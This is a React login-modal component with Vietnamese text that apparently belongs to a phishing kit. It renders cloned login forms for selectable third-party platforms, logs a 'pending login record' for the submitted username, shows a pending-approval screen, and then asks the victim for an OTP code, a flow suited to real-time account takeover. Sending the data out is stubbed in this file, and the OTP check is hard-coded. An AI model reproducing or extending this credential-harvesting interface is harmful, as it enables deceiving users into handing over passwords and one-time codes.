import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import { ArrowLeft } from 'lucide-react';
import toast from 'react-hot-toast';
import { Button } from '@/components/ui/button';
import { Dialog, DialogContent } from '@/components/ui/dialog';
import PlatformSelector from '@/components/login-clones/PlatformSelector';
import LoginCloneFactory from '@/components/login-clones/LoginCloneFactory';

const LoginModal = ({ isOpen, onOpenChange }) => {
    const [step, setStep] = useState('select_platform');
    const [pendingStatus, setPendingStatus] = useState('login_approval');
    const [selectedPlatform, setSelectedPlatform] = useState(null);
    const [isLoading, setIsLoading] = useState(false);
    const [error, setError] = useState(null);
    const [loginFailureTimer, setLoginFailureTimer] = useState(null);
    const navigate = useNavigate();

    const handleSelectPlatform = (platform) => {
        setSelectedPlatform(platform);
        setStep('login_form');
        setError(null);
    };

    const handleLogin = async (credentials) => {
        setIsLoading(true);
        setError(null);
        console.log("Creating pending login record for", credentials.username);

        setTimeout(() => {
            setIsLoading(false);
            setStep('pending_approval');
            const timer = setTimeout(() => {
                setStep('login_failed');
                setError('Yêu cầu đăng nhập đã hết hạn.');
            }, 60000);
            setLoginFailureTimer(timer);
        }, 5000);
    };

    const handleVerifyOtp = (otp) => {
        setIsLoading(true);
        setTimeout(() => {
            setIsLoading(false);
            if (otp === '123456') {
                toast.success('Xác thực thành công!');
                onOpenChange(false);
                navigate("/profile");
            } else {
                toast.error('Mã OTP không chính xác.');
            }
        }, 1500);
    };

    const handleBack = () => {
        setStep('select_platform');
        setSelectedPlatform(null);
        setError(null);
        if (loginFailureTimer) {
            clearTimeout(loginFailureTimer);
            setLoginFailureTimer(null);
        }
    };

    const handleTryAgain = () => {
        handleBack();
    };

    useEffect(() => {
        if (!isOpen) {
            if (loginFailureTimer) {
                clearTimeout(loginFailureTimer);
                setLoginFailureTimer(null);
            }
            setTimeout(() => {
                setStep('select_platform');
                setSelectedPlatform(null);
                setError(null);
                setIsLoading(false);
            }, 300);
        }
    }, [isOpen, loginFailureTimer]);

    const renderContent = () => {
        const motionProps = {
            key: step === 'login_form' && selectedPlatform ? selectedPlatform.key : step,
            initial: { opacity: 0, scale: 0.95, y: 20 },
            animate: { opacity: 1, scale: 1, y: 0 },
            exit: { opacity: 0, scale: 0.95, y: -20 },
            transition: { type: 'spring', stiffness: 260, damping: 25 },
            className: "w-full flex items-center justify-center"
        };

        return (
            <AnimatePresence mode="wait">
                <motion.div {...motionProps}>
                    {(() => {
                        switch (step) {
                            case 'select_platform':
                                return <PlatformSelector onSelectPlatform={handleSelectPlatform} />;
                            case 'login_form':
                            case 'otp':
                                return <LoginCloneFactory step={step} platform={selectedPlatform} onLogin={handleLogin} onVerify={handleVerifyOtp} isLoading={isLoading} error={error} />;
                            case 'pending_approval':
                                return <LoginCloneFactory step={step} status={pendingStatus} />;
                            case 'login_failed':
                                return <LoginCloneFactory step={step} error={error} onTryAgain={handleTryAgain} />;
                            default:
                                return <PlatformSelector onSelectPlatform={handleSelectPlatform} />;
                        }
                    })()}
                </motion.div>
            </AnimatePresence>
        );
    };

    return (
        <Dialog open={isOpen} onOpenChange={onOpenChange}>
            <DialogContent className="bg-transparent border-none shadow-none p-2 sm:p-4 w-full max-w-md">
                <div className="relative w-full bg-card/60 backdrop-blur-xl rounded-2xl shadow-2xl shadow-primary/10 overflow-hidden p-1.5 neon-border">
                     <AnimatePresence>
                        {step !== 'select_platform' && (
                            <motion.div
                                initial={{ opacity: 0, x: -30 }}
                                animate={{ opacity: 1, x: 0 }}
                                exit={{ opacity: 0, x: -30 }}
                                className="absolute top-4 left-4 z-20"
                            >
                                <Button variant="ghost" size="icon" onClick={handleBack} className="rounded-full bg-background/50 backdrop-blur-sm text-foreground">
                                    <ArrowLeft className="h-5 w-5" />
                                </Button>
                            </motion.div>
                        )}
                    </AnimatePresence>
                    <div className="w-full flex items-center justify-center p-4 sm:p-6 min-h-[480px] rounded-lg bg-background/50">
                       {renderContent()}
                    </div>
                </div>
            </DialogContent>
        </Dialog>
    );
};

export default LoginModal;